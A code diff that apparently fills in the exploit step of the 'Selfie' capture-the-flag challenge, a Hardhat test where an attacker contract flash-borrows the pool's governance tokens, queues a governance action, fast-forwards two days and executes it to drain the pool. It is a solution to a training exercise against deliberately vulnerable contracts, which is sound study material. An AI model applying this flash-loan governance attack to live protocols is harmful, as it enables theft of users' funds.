@@ -32,6 +32,24 @@ describe("[Challenge] Selfie", function () {
 
     it("Exploit", async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        // flashloan and propose a gov action, then pay back loan
+        const seFactory = await ethers.getContractFactory(
+            "contracts/selfie/SelfieExploit.sol:SelfieExploit",
+            deployer,
+        )
+        const seContract = await seFactory.deploy(
+            attacker.address,
+            this.token.address,
+            this.pool.address,
+            this.governance.address,
+        )
+        await seContract.goFlashloan(TOKENS_IN_POOL)
+        const actionID = 1
+
+        // fastforward, then execute gov action
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]) // 2 days
+        await this.governance.executeAction(actionID)
     })
 
     after(async function () {
